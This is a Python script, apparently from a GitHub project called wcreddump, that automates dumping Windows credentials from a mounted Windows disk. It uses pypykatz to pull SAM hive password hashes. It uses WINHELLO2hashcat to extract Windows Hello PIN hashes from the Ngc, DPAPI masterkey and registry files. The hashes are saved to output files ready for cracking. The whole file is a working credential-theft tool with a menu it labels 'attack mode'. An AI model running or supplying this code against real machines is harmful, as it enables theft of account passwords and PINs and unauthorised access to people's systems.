# wcreddump (windows credentials dump)
# Automated script to dump login credentials hashes on windows disks, classic passwords and pins
#
#Requires the following conditions :
# - To be run from a GNU/linux's terminal (python wcreddump.py)
# - pypykatz installed on system (apt install pypykatz)
# - python >=3.10 with the following libs installed : dpapick3, PyCryptodome (pip install dpapick3 PyCryptodome)
# - WINHELLO2hashcat.py in the same directory as wcreddump.py (https://github.com/Banaanhangwagen/WINHELLO2hashcat)
# - A mounted drive with a windows os on it
#
# Author : https://github.com/truerustyy
# GitHub : https://github.com/truerustyy/wcreddump

from subprocess import check_output
from psutil import disk_partitions
from time import time 
import os

### INIT ###
autosave = True
dumpInfos = False #will work only if autosave is on and mode 0 or 2 is used
	
outputDirectory = "/outputs/"
scriptPath = os.path.dirname(__file__)
disks = disk_partitions()

### DISK SELECTION ###
drives = []
i = 0
for disk in disks :
	if disk.fstype == "fuseblk" :
		name = disk.mountpoint.split("/")[-1]
		drives.append(name)
		print(f"{i} : {name}")
		i += 1
if i == 0 :
	print("no available drive, please make sure that a windows drive is mounted")
	exit()
elif i == 1 :
	print(f"select windows system drive (0-0) : 0") 
	driveID = 0
else :
	driveID = int(input(f"select windows system drive (0-{i-1}) : "))
C = f"/media/kali/{drives[driveID]}"
print()

### DEBUG ###
if not os.path.isdir(f"{C}/Windows/System32") :
	print("error : selected drive is not a windows system drive")
	exit()
if autosave and not os.path.isdir(scriptPath+outputDirectory) :
	os.makedirs(scriptPath+outputDirectory)

### ATTACK MODE SELECTION ###
print("0 : dump SAM hive\n1 : dump WINHELLO\n2 : dump both if possible")
mode = int(input(f"select attack mode (0-2) : "))
print()

### SAM DUMPING ###
if mode == 0 or mode == 2 :
	print("dumping sam...")
	path = f"{C}/Windows/System32/config"
	print(f"full path to SAM hive : \"{path}\"")
	os.chdir(path)
	raw = check_output("pypykatz registry --sam SAM --security SECURITY --software SOFTWARE SYSTEM", shell=True).decode()
	sam = "\n".join(raw.split("============== SAM hive secrets ==============")[1].split("============== SECURITY hive secrets ==============")[0].split("\n")[2:])
	t = round(time(), 2)
	print("\n"+sam)
	os.chdir(scriptPath)
	if autosave :
		with open(scriptPath+f"{outputDirectory}SAM ({drives[driveID]})-{t}", "w") as f :
			f.write(sam)
		print(f"succesfully dumped SAM's hash.es to \"SAM ({drives[driveID]})-{t}\"\n")
		if dumpInfos :
			with open(scriptPath+f"{outputDirectory}INFOS ({drives[driveID]})-{t}", "w") as f :
				f.write(raw)
			print(f"succesfully dumped OS infos to \"INFOS ({drives[driveID]})-{t}\"\n")
	

### WINHELLO DUMPING ###
if mode == 1 or mode == 2 :
	print("dumping WINHELLO...")
	if os.path.isdir(C+"/Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/") :
		if os.listdir(C+"/Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/") != []:
			cryptokeys = f'--cryptokeys  "{C}/Windows/ServiceProfiles/LocalService/AppData/Roaming/Microsoft/Crypto/Keys/"'
			masterkey = f'--masterkey "{C}/Windows/System32/Microsoft/Protect/S-1-5-18/User/"'
			system = f'--system "{C}/Windows/System32/config/SYSTEM"'
			security = f'--security "{C}/Windows/System32/config/SECURITY"'
			ngc = f'--ngc "{C}/Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/"'
			try :
				hashes = check_output(f"python WINHELLO2hashcat.py {cryptokeys} {masterkey} {system} {security} {ngc}", shell=True).decode()
				t = round(time(), 2)
				print(hashes)
				if autosave :
					with open(scriptPath+f"{outputDirectory}WINHELLO ({drives[driveID]})-{t}", "w") as f :
						f.write(hashes)
				print(f"succesfully dumped WINHELLO pin.s to \"WINHELLO ({drives[driveID]})-{t}\"")
			except :
				print("error on dumping, see https://github.com/Banaanhangwagen/WINHELLO2hashcat")
		else :
			print("no WINHELLO on system")
	else :
		print("ivalid windows version (likely too old)")
